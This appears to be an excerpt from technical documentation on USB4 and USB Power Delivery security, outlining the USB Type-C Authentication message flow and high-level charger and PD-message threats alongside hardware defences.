USB4 (USB4 Specification v2.0, USB-IF, 2022): based on Thunderbolt 4 protocol, mandates:

  • USB4 v2 maximum speed: 80 Gbps (PAM-4 signalling)

  • USB-IF Authentication (USB Type-C Authentication Specification, 2019): X.509 certificate chain, ECDSA P-256 signature over device descriptors, prevents USB device identity spoofing, certified by USB-IF (certbody)

  • Mandatory IOMMU support for all USB4 DMA devices

  • USB Power Delivery 3.1: 48 V / 5 A = 240 W maximum, programmable voltage requires PD policy enforcement in embedded controller

USB-IF Authentication protocol:

# USB Authentication Message Flow (USB Type-C Auth. Spec. Rev 1.0)
Host -> Device: GET_DIGESTS (request certificate chain hashes)
Device -> Host: DIGESTS (SHA-256 hashes of cert chain slots)
Host -> Device: GET_CERTIFICATE (request specific cert)
Device -> Host: CERTIFICATE (X.509 DER blob, max 4 KB per slot)
Host -> Device: CHALLENGE (64-byte random nonce)
Device -> Host: CHALLENGE_AUTH (ECDSA P-256 signature over nonce + cert hash)
Host: Verify ECDSA signature against USB-IF root CA
# If verification fails: block device access or limit to charging only

docs.title: 35.12 USB Power Delivery Security
docs.text:
USB PD 3.1 raises the maximum voltage to 48 V and power to 240 W. Security concerns:

  • A malicious charger (rogue power adapter) can negotiate a higher voltage than the device supports, potentially damaging the battery management IC

  • Uncontrolled CC (Configuration Channel) communication: CC lines carry PD negotiation messages; a crafted PD message could trigger FRS (Fast Role Swap) or EPR (Extended Power Range) modes unexpectedly

  • Charger attacks: inject voltage surges via VBUS after initial PD negotiation (“charger MitM” – intercept and modify PD data objects)

Defence: USB PD controller (e.g., FUSB302, Infineon CYPD3177) with firmware validation and hard voltage limits enforced in hardware by the Embedded Controller (EC), independent of host OS.
